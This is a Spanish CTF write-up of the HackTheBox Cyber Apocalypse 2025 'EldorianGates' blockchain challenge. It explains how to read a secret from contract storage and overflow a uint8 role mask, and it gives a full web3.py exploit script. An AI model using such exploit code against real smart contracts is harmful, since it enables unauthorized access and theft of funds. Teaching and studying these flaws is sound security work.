---
title: "EldorianGates - Cyber Apocalypse 2025"
layout: post
permalink: /writeups/cyberapocalypse2025/eldoriangates
date: 2025-03-28 13:45:00 +0000
categories: [HacktheBox, CTF]
tags: [CyberApocalypse, HTB, Blockchain, SmartContracts]
image:
  path: /assets/img/cabeceras_genericas/cyberapocalypse2025.png
  alt: Cyber Apocalypse 2025 - HackTheBox
description: >
  Resolución del reto EldorianGates de la categoría Blockchain durante el CTF HackTheBox Cyber Apocalypse 2025.
pin: false
toc: true
math: false
mermaid: false
---

# EldorianGates - Blockchain

## 1. Descripción del reto

El reto consiste en interactuar correctamente con un contrato inteligente donde, mediante manipulación de almacenamiento y condiciones lógicas del código, puedes alcanzar el estado de **usurper**, condición necesaria para obtener la flag.

La clave está en explotar:
- El almacenamiento del contrato kernel.
- Un **wraparound** causado por una suma controlada sobre un `uint8`.
- La verificación incompleta de roles y autenticación.

---

## 2. Proceso de explotación

### 2.1 Obtención del secreto del kernel

El contrato `EldoriaGateKernel` almacena un **secreto** en su primer slot de almacenamiento.

```python
w3.eth.get_storage_at(kernel_address, 0)
```

Tomando los últimos 4 bytes del slot, obtuvimos el secreto necesario.

---

### 2.2 Construcción del passphrase

En la función `authenticate`, la comparación toma solo los **4 bytes** más significativos del valor pasado.

- Basta con pasar directamente el secreto extraído (`0xdeadfade` en este caso) para pasar la validación.
- Esto nos otorga el estado de **authenticated = true**.

---

### 2.3 Manipulación del `rolesBitMask`

El contrato realiza la operación:

```solidity
roles = defaultRolesMask + _contribution;
```

- `defaultRolesMask` es 1.
- Enviamos **255 wei** exactos en la transacción.

Esto genera: `1 + 255 = 256`, pero como `roles` es un `uint8`, provoca:

```
256 % 256 = 0
```

Dejando `rolesBitMask = 0`.

---

### 2.4 Cumpliendo la condición de usurper

La función clave es:

```solidity
bool isUsurper = authenticated && (rolesBitMask == 0);
```

Dado que:
- `authenticated == true`
- `rolesBitMask == 0`

La condición se cumple, convirtiéndonos en **usurper**.

---

## 3. Script utilizado

```python
from web3 import Web3
import json

# 1. Conectar a la red
provider_url = "RPC_PROVIDER_URL"
w3 = Web3(Web3.HTTPProvider(provider_url))

if not w3.is_connected():
    raise Exception("No se pudo conectar al nodo. Verifica la URL del proveedor.")

# 2. Configurar la cuenta del jugador usando su private key
player_private_key = "PLAYER_PRIVATE_KEY"
player_account = w3.eth.account.from_key(player_private_key)
player_address = player_account.address
print("Cuenta del jugador:", player_address)

# 3. ABI del contrato objetivo (EldoriaGate) con funciones y eventos necesarios
target_abi = [
    {
        "inputs": [
            {"internalType": "bytes4", "name": "passphrase", "type": "bytes4"}
        ],
        "name": "enter",
        "outputs": [],
        "stateMutability": "payable",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address", "name": "_villager", "type": "address"}
        ],
        "name": "checkUsurper",
        "outputs": [
            {"internalType": "bool", "name": "", "type": "bool"}
        ],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address", "name": "_villager", "type": "address"}
        ],
        "name": "getVillagerRoles",
        "outputs": [
            {"internalType": "string[]", "name": "", "type": "string[]"}
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "anonymous": False,
        "inputs": [
            {"indexed": False, "internalType": "address", "name": "villager", "type": "address"},
            {"indexed": False, "internalType": "uint256", "name": "id", "type": "uint256"},
            {"indexed": False, "internalType": "bool", "name": "authenticated", "type": "bool"},
            {"indexed": False, "internalType": "string[]", "name": "roles", "type": "string[]"}
        ],
        "name": "VillagerEntered",
        "type": "event"
    },
    {
        "anonymous": False,
        "inputs": [
            {"indexed": False, "internalType": "address", "name": "villager", "type": "address"},
            {"indexed": False, "internalType": "uint256", "name": "id", "type": "uint256"},
            {"indexed": False, "internalType": "string", "name": "alertMessage", "type": "string"}
        ],
        "name": "UsurperDetected",
        "type": "event"
    },
    {
        "inputs": [],
        "name": "kernel",
        "outputs": [
            {"internalType": "contract EldoriaGateKernel", "name": "", "type": "address"}
        ],
        "stateMutability": "view",
        "type": "function"
    }
]

# 4. Dirección del contrato objetivo
target_contract_address = "TARGET_CONTRACT_ADDRESS"
target_contract = w3.eth.contract(address=target_contract_address, abi=target_abi)

# 5. Obtener la dirección del contrato kernel
kernel_address = target_contract.functions.kernel().call()
print("Dirección del kernel:", kernel_address)

# 6. Leer el storage slot 0 del kernel para obtener el secret
kernel_storage = w3.eth.get_storage_at(kernel_address, 0)
print("Raw storage slot 0 del kernel:", kernel_storage.hex())

# Se asume que el secret (bytes4) está almacenado en los últimos 4 bytes del slot
secret = kernel_storage[-4:].hex()  # Extrae los últimos 4 bytes
print("Secret extraído (bytes4):", "0x" + secret)

# Construir el passphrase a utilizar (usando directamente el secret)
passphrase = "0x" + secret
print("Passphrase a utilizar:", passphrase)

# 7. Llamar a la función 'enter' enviando EXACTAMENTE 255 wei.
nonce = w3.eth.get_transaction_count(player_address)
enter_txn = target_contract.functions.enter(passphrase).build_transaction({
    'from': player_address,
    'value': 255,  # EXACTAMENTE 255 wei
    'nonce': nonce,
    'gas': 300000,
    'gasPrice': w3.to_wei('10', 'gwei')
})

signed_enter_txn = w3.eth.account.sign_transaction(enter_txn, private_key=player_private_key)
tx_hash = w3.eth.send_raw_transaction(signed_enter_txn.raw_transaction)
print("Transacción de 'enter' enviada. Tx hash:", tx_hash.hex())

enter_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print("Transacción 'enter' minada en el bloque:", enter_receipt.blockNumber)
print("Logs completos de 'enter':")
for log in enter_receipt.logs:
    print(log)

# Decodificar evento VillagerEntered (si se emitió)
try:
    enter_events = target_contract.events.VillagerEntered().process_receipt(enter_receipt)
    print("Eventos VillagerEntered:")
    for event in enter_events:
        print(json.dumps(dict(event), indent=4, default=lambda o: o.hex() if hasattr(o, 'hex') else o))
except Exception as e:
    print("Error al decodificar VillagerEntered:", e)

# 8. Consultar los roles asignados (para depuración)
try:
    roles = target_contract.functions.getVillagerRoles(player_address).call({'from': player_address})
    print("Roles asignados al jugador:", roles)
except Exception as e:
    print("No se pudo obtener los roles:", e)

# 9. Llamar a 'checkUsurper' para verificar si se logró el exploit
nonce = w3.eth.get_transaction_count(player_address)
check_txn = target_contract.functions.checkUsurper(player_address).build_transaction({
    'from': player_address,
    'nonce': nonce,
    'gas': 300000,
    'gasPrice': w3.to_wei('10', 'gwei')
})

signed_check_txn = w3.eth.account.sign_transaction(check_txn, private_key=player_private_key)
check_tx_hash = w3.eth.send_raw_transaction(signed_check_txn.raw_transaction)
print("Transacción de 'checkUsurper' enviada. Tx hash:", check_tx_hash.hex())

check_receipt = w3.eth.wait_for_transaction_receipt(check_tx_hash)
print("Transacción 'checkUsurper' minada en el bloque:", check_receipt.blockNumber)
print("Logs completos de 'checkUsurper':")
for log in check_receipt.logs:
    print(log)

# Decodificar evento UsurperDetected (si se emitió)
try:
    check_events = target_contract.events.UsurperDetected().process_receipt(check_receipt)
    print("Eventos UsurperDetected:")
    for event in check_events:
        print(json.dumps(dict(event), indent=4, default=lambda o: o.hex() if hasattr(o, 'hex') else o))
except Exception as e:
    print("Error al decodificar UsurperDetected:", e)

# 10. Llamada de lectura para obtener directamente el resultado (sin gastar gas)
is_usurper = target_contract.functions.checkUsurper(player_address).call({'from': player_address})
print("¿El jugador es usurper?", is_usurper)

# 11. Consultar directamente el mapping 'villagers' en el kernel
kernel_abi = [
    {
        "inputs": [{"internalType": "address", "name": "", "type": "address"}],
        "name": "villagers",
        "outputs": [
            {"internalType": "uint256", "name": "", "type": "uint256"},
            {"internalType": "bool", "name": "", "type": "bool"},
            {"internalType": "uint8", "name": "", "type": "uint8"}
        ],
        "stateMutability": "view",
        "type": "function"
    }
]
kernel_contract = w3.eth.contract(address=kernel_address, abi=kernel_abi)
villager_info = kernel_contract.functions.villagers(player_address).call()
print("Contenido del mapping 'villagers' para el jugador (id, authenticated, rolesBitMask):", villager_info)
```

---

## 4. Resultado

Si todo se ha ejecutado correctamente:
- La variable `authenticated` será `true`.
- El `rolesBitMask` será `0`.
- La función `checkUsurper()` devolverá `true`.

El reto quedará superado y podrás generar la flag con la información revelada por el sistema.

```
HTB{XXXXXXXX}
```

---

## 5. Conceptos claves aplicados

| Concepto | Explicación |
|----------|-------------|
| Storage reading | Acceso a storage directamente desde el nodo con `get_storage_at()` |
| Passphrase validation | Comparación truncada a los 4 bytes significativos |
| Wraparound en uint8 | Suma intencional que provoca overflow a `0` |
| Logic exploit | Condición booleana basada en `authenticated` y `rolesBitMask == 0` |

---